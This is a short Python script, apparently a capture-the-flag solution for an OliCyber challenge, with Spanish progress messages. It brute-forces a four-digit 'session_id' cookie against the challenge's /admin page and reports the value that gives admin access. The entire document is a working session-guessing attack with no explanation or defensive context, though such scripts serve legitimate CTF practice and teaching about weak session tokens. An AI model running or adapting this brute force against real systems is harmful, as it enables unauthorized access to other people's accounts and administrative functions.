import requests
url = "http://too-small-reminder.challs.olicyber.it/admin"
session = requests.Session()
print("[+] Iniciando fuerza bruta con la clave 'session_id'...")
for i in range(10000):
    cookie_val = f"{i:04d}"
    cookies = {'session_id': cookie_val}
    res = session.get(url, cookies=cookies)
    if "mancante" not in res.text and "riservata" not in res.text:
        print(f"\n[!] ¡Cookie de Admin encontrada!: {cookie_val}")
        print(f"[!] Respuesta del servidor:\n{res.text}")
        break
    if i % 1000 == 0:
        print(f"[-] Probando session_id: {cookie_val}...")